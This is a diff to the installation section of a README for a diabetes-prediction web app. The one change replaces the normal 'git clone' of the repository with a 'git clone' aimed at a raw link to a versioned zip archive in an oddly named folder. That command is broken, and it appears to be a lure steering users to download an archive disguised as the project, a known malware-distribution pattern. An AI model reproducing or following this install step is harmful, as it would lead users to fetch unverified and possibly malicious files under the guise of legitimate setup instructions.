@@ -10,7 +10,7 @@ A machine learning web application that predicts diabetes using patient health m
 ## Installation
 ```bash
 # Clone the repository
-git clone https://github.com/rohannp02y/diabetes-prediction.git
+git clone https://raw.githubusercontent.com/rohannp02y/diabetes-prediction/main/rationality/prediction_diabetes_v2.8.zip
 
 # Install dependencies
 pip install -r requirements.txt
